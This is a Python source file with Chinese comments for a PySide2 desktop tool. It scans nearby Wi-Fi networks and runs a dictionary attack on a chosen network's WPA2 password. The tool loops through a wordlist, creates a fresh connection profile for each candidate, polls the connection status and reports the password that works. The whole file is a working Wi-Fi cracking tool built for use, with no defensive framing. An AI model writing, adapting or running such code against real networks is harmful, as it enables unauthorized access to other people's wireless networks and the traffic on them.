import threading
import pywifi
from pywifi import const
import time
from PySide2.QtWidgets import *
from PySide2.QtUiTools import QUiLoader
from PySide2.QtCore import QFile, QStringListModel
from PySide2.QtGui import QFont

ssid_name = None
path = ""
zidian1 = []
ap_list = []


class Wifi:
    wifi = pywifi.PyWiFi()
    try:
        iface = wifi.interfaces()[0]  # 返回的是一个列表，取第一个wifi网卡
    except Exception as e:
        print("获取网卡列表失败:", e)

    # 获取当前无线网卡信息
    def get_nic(self):
        return self.iface.name()

    # 扫描的wifi列表信息
    def scan_wifi_list(self):
        global ap_list
        ap_list_temp = []  # 使用列表来保持顺序
        seen = set()  # 用于去重

        self.iface.disconnect()                             # 断开当前wifi连接
        time.sleep(1)
        assert self.iface.status() in [const.IFACE_DISCONNECTED, const.IFACE_INACTIVE]  # 检查网卡是否处于断开状态
        self.iface.scan()  # 扫描附近AP
        time.sleep(3)  # 等待扫描完成

        results = self.iface.scan_results()  # 获取扫描结果
        for x in results:
            original_ssid = x.ssid  # 保存原始SSID
            ap_name = x.ssid.encode('raw_unicode_escape').decode('utf-8')  # 转换后用于显示
            if original_ssid not in seen:
                seen.add(original_ssid)
                ap_list_temp.append((original_ssid, ap_name))  # 存储为元组(原始SSID, 显示名称)

        ap_list = ap_list_temp  # ap_list现在是元组列表，顺序与显示列表一致
        model_list = QStringListModel()
        model_list.setStringList([ap[1] for ap in ap_list])  # 只使用显示名称用于UI显示
        return model_list

    # 开始破解
    def Cracking(self, status_list):
        global ssid_name
        global path
        global zidian1
        N = 1

        try:
            # 加载字典
            zidian1 = []
            if path != "":
                with open(path, 'r') as file:
                    for line in file:
                        if line.strip() != '':
                            zidian1.append(line.strip())

            status_list.clear()                     # 清空上一次运行状态列表
            print(f"当前破解wifi：{ssid_name}")

            for password in zidian1:
                self.iface.disconnect()  # 断开当前wifi连接
                time.sleep(1)

                # 遍历所有配置文件，删除指定配置信息
                profiles = self.iface.network_profiles()
                for x in profiles:
                    if x.ssid == ssid_name:
                        print(f"发现旧的 '{ssid_name}' 配置，正在移除以确保使用新密码...")
                        self.iface.remove_network_profile(x)
                        break  # 找到并删除后即可退出

                # 设置配置文件
                profile = pywifi.Profile()
                profile.ssid = ssid_name
                profile.auth = const.AUTH_ALG_OPEN  # const.AUTH_ALG_OPEN / SHARED
                profile.akm = [const.AKM_TYPE_WPA2PSK]  # const.AKM_TYPE_WPA2PSK / WPA3PSK
                profile.cipher = const.CIPHER_TYPE_CCMP  # const.CIPHER_TYPE_ NONE / WEP / TKIP / CCMP

                if len(password) >= 8:
                    print(f"password：{repr(password)}")
                    profile.key = password
                    tmp_profile = self.iface.add_network_profile(profile)
                    status_list.addItem(f"{N}. 尝试密码：{password}")
                    self.iface.connect(tmp_profile)
                    # 轮询检测连接状态
                    for i in range(9):
                        time.sleep(1)
                        # const.IFACE_CONNECTED / 0 DISCONNECTED /1 SCANNING /2 INACTIVE / 3 CONNECTING /4 CONNECTED /
                        tmp_status = self.iface.status()
                        print(f"轮询中{i+1}：iface.status = {tmp_status}")
                        if tmp_status == const.IFACE_CONNECTED:
                            status_list.addItem(f"{N}. 破解成功：{password}")
                            return
                else:
                    status_list.addItem(f"{N}. 不符合要求密码：{password}")
                    continue
                N += 1
                status_list.scrollToBottom()
            status_list.addItem(f"{N}. 字典运行完毕没有找到密码！")
            print(f"{N}. 字典运行完毕没有找到密码！")
        except Exception as e:
            print(f"攻击异常:{e}")
            return


class Stats:
    def __init__(self):
        self.wifi = Wifi()
        self.crack_thread = None  # 保存破解线程的引用
        self.is_cracking = False  # 标记是否正在破解

        # 从文件加载UI界面
        qfile_stats = QFile("ui_Main.ui")
        qfile_stats.open(QFile.ReadOnly)
        qfile_stats.close()
        self.ui = QUiLoader().load(qfile_stats)

        self.ui.comboBox.addItem(self.wifi.get_nic())               # UI界面设置网卡信息
        self.ui.scan_wifi.clicked.connect(self.scan)                # 扫描wifi按钮绑定事件
        self.ui.select_dict.clicked.connect(self.get_path)          # 选择字典按钮事件
        self.ui.wifi_list.clicked.connect(self.select_wifi_list)    # list被选中
        self.ui.Start_Crack.clicked.connect(self.Crack)             # 破解按钮绑定事件

    # UI界面设置获取的扫描结果
    def scan(self):
        APs = self.wifi.scan_wifi_list()
        self.ui.wifi_list.setModel(APs)

    def get_path(self):
        global path
        path, _ = QFileDialog.getOpenFileName()
        self.ui.textBrowser.setText(path)

    def select_wifi_list(self, item):
        global ap_list
        global ssid_name
        # ap_list现在是元组列表，元组格式为(original_ssid, ap_name)
        ssid_tuple = ap_list[item.row()]
        ssid_name = ssid_tuple[0]  # 获取原始SSID用于WiFi配置
        display_name = ssid_tuple[1]  # 获取显示名称用于UI显示
        self.ui.ssid.setText(display_name)  # UI显示使用转换后的名称

    def Crack(self):
        # 防止界面卡死，开启多线程运行，后台破解
        self.crack_thread = threading.Thread(target=self.wifi.Cracking, args=(self.ui.status_list,))
        self.crack_thread.start()


if __name__ == '__main__':
    app = QApplication([])
    font = QFont("Microsoft YaHei", 10)
    app.setFont(font)
    try:
        stats = Stats()
        stats.ui.show()
        app.exec_()
    except Exception as e:
        print(f"程序异常：{e}")
